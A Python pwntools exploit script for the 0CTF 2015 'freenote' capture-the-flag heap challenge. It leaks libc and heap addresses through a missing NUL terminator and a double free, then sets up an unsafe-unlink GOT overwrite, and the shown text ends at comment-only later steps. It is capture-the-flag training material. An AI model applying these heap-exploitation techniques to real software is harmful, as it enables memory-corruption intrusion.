#
# 0CTF 2015 pwn freenote
#

from pwn import *

r = process('./freenote')

b = ELF('./freenote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = b.arch
context.log_level = 'info'

def new_note(s):
    r.send('2\n')
    r.sendafter('Length of new note:', str(len(s))+'\n')
    r.sendafter('Enter your note:', s)

def delete_note(n):
    r.send('4\n')
    r.sendafter('Note number:', str(n)+'\n')

#
# 1 free() -> fd & bk pointer points <main_arena>
#
def leak_main_arena():
    r.send('1\n')
    r.recvuntil('CCCCCCCC')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l) 
    
    while len(l) < 8:
        l = l + '\x00'

    l = u64(l)
    log.info('leaked libc: 0x%x' % l)
    return l

#
# 2 free()s -> 
# the 1st free chunk -> fd points the 2nd free chunk (bk points <main_arena>)
# the 2nd free chunk -> bk points the 1st free chunk (fd points <main_arena>)
#
# we are going to leak this bk pointer.
#
def leak_heap():
    r.send('1\n')
    r.recvuntil('DDDDDDDD')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l)

    while len(l) < 8:
        l = l + '\x00'

    l = u64(l)
    log.info('leaked heap: 0x%x' % l)
    return l


if __name__ == "__main__":

    #
    # 'freenote' has two critical vulnerabilities.
    #
    # 1) it does not append trailing NULL when it reads string from stdin.
    # 2) you can free() already freed chunks.
    #
    # exploit strategy will be
    #
    # 1) alloc & free 3 chunks
    # 2) alloc carefully crafted memory overlapping with already free'ed memory region. 
    #    (thus overwriting the metadata)
    # 3) free the chunk again 
    #

    #
    # NOTE_TABLE
    #
    # ------------------------
    # [HEADER]
    # ------------------------
    # [TABLE SIZE, 256]
    # [COUNT, 0 ~ 256]
    #
    # ------------------------
    # [DATA]
    # ------------------------
    # [OCCUPIED FLAG, 0 or 1]
    # [NOTE SIZE, 0 ~ 4096]
    # [PTR TO CHUNK]
    #
    # [OCCUPIED FLAG, 0 or 1]
    # [NOTE SIZE, 0 ~ 4096]
    # [PTR TO CHUNK]
    #
    # ...
    #

    r.recvuntil('Your choice:')

    new_note(p32(0xdeadbeef))
    new_note(p32(0xdeadbeef))

    delete_note(0)

    new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
    
    main_arena = leak_main_arena() 

    log.info('main_arena: 0x%x' % main_arena)

    raw_input('after leaking main_arena...')

    delete_note(0)
    delete_note(1)
    
    raw_input('after cleanup...')

    for _ in xrange(4):
        new_note(p32(0xcafebabe))

    raw_input("after malloc four 0xcafebabe's...")

    #
    # don't free adjacent chunks!!! it will cause heap coalescing.
    # we need two free chunks pointing each other
    #

    delete_note(2) # basically, the order is not important.
    delete_note(0)
    
    raw_input('after 2 frees...')

    new_note('D'*8)
    leaked_heap = leak_heap()
    
    raw_input('after leaking heap...')

    delete_note(0)
    delete_note(1)
    delete_note(3)

    raw_input('after another cleanup...')

    #
    # Step 1)
    #
    # prepare heap feng shui suitable for "unsafe_unlink" technique
    #

    new_note('A'*0x100)
    new_note('B'*0x100)
    new_note('C'*0x100)
    
    delete_note(2)
    delete_note(1)
    delete_note(0)

    #
    # Step 2)
    #
    # land the carefully crafted one big chunk which will overwrite the metadata of 3 (already free'ed) chunks
    #

    #
    # unlink(AV, P, BK, FD) will take a chunk P off a binlist ( FD <-> P <-> BK ) 
    #
    # we have to bypass a lot of integrity checks.
    #
    # FD->bk == P && BK->fd == P
    # 

    #
    # Step 3)
    # 
    # doing free() a chunk which has corrupted metadata will do classic 'FD->bk = BK' memory write.
    # by using this write primitive, we can overwrite GOT
    #
